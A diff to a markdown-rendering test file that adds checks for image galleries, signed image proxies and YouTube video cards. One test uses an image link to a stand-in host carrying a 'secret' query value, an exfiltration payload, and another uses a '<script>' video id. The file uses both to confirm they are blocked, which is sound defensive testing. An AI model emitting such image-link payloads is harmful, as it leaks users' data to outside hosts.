@@ -386,6 +386,29 @@ section('the card learns titles and summaries from a search the tab saw');
   check('a result with no summary still has its title', b?.title === 'Giới hạn mới của Openrouter' && !b.snippet);
 }
 
+section('pictures and videos in a reply');
+{
+  const signed = '/api/image?u=https%3A%2F%2Fshop.example%2Fsvj.jpg&s=abcDEF_123-xyz';
+  const row = renderMarkdown(`Here they are:\n\n![SVJ 63 coupe](${signed})\n![SVJ roadster](${signed.replace('svj', 'svj2')})\n\nThat is all.`);
+  check('pictures on their own lines become one row', (row.match(/class="mdgallery"/g) || []).length === 1 && (row.match(/mdgallery__item/g) || []).length === 2, row.slice(0, 200));
+  check('  each with its caption', /mdgallery__cap">SVJ 63 coupe</.test(row));
+  check('  and the prose around them stays prose', /<p>Here they are:<\/p>/.test(row) && /<p>That is all\.<\/p>/.test(row));
+  const outside = renderMarkdown('![leak](https://evil.example/?d=secret)');
+  check('an address the server did not sign is never fetched as a picture', !/<img/.test(outside) && /<a href="https:\/\/evil\.example/.test(outside), outside);
+  const inline = renderMarkdown(`See ![x](${signed}) here.`);
+  check('a signed picture inside a sentence is drawn inline', /<img class="mdimg" src="\/api\/image\?u=/.test(inline), inline);
+  check('  with its signature intact', inline.includes('s=abcDEF_123-xyz'));
+
+  const video = renderMarkdown('[Tardis SVJ review](https://www.youtube.com/watch?v=dQw4w9WgXcQ)');
+  check('a YouTube link on its own line is a video card', /class="mdvideo" data-yt="dQw4w9WgXcQ"/.test(video), video.slice(0, 160));
+  check('  with its title and a thumbnail through this server', /Tardis SVJ review/.test(video) && /\/api\/image\?u=https%3A%2F%2Fi\.ytimg\.com%2Fvi%2FdQw4w9WgXcQ/.test(video));
+  const two = renderMarkdown('- https://youtu.be/dQw4w9WgXcQ\n- [Second](https://www.youtube.com/shorts/abcdefghijk)');
+  check('a list of videos is a row of cards', /class="mdvideos"/.test(two) && (two.match(/class="mdvideo"/g) || []).length === 2, two.slice(0, 160));
+  const sentence = renderMarkdown('Watch https://www.youtube.com/watch?v=dQw4w9WgXcQ later.');
+  check('a video link inside a sentence stays a link', !/mdvideo/.test(sentence) && /<a href=/.test(sentence));
+  check('a bad id is not a video', !/mdvideo/.test(renderMarkdown('https://www.youtube.com/watch?v=<script>')));
+}
+
 console.log(
   failures ? `\n\x1b[31m${failures} check(s) failed.\x1b[0m\n` : '\n\x1b[32mAll markdown checks passed.\x1b[0m\n',
 );
